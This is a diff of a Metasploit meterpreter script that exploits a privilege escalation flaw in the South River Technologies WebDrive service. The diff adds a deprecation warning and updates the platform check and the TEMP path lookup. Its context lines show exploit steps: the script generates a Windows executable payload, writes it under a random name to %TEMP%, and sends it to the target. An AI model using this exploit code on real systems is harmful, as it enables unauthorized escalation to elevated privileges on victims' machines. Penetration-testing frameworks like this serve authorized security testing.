@@ -1,4 +1,11 @@
 ##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to improve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
+##
 # South River Technologies WebDrive Service Bad Security Descriptor Local Privilege Escalation.
 #
 #  This module exploits a privilege escalation vulnerability in South River Technologies WebDrive.
@@ -44,7 +51,7 @@ def unsupported
   print_error("This version of Meterpreter is not supported with this Script!")
   raise Rex::Script::Completed
 end
-unsupported if client.platform !~ /win32|win64/i
+unsupported if client.platform != 'windows'
 #
 # Option parsing
 #
@@ -87,7 +94,7 @@ client.sys.process.get_processes().each do |m|
     exe = Msf::Util::EXE.to_win32pe(client.framework, raw)
 
     # Place our newly created exe in %TEMP%
-    tempdir = client.fs.file.expand_path("%TEMP%")
+    tempdir = client.sys.config.getenv('TEMP')
     tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
     print_status("Sending EXE payload '#{tempexe}'.")
     fd = client.fs.file.new(tempexe, "wb")
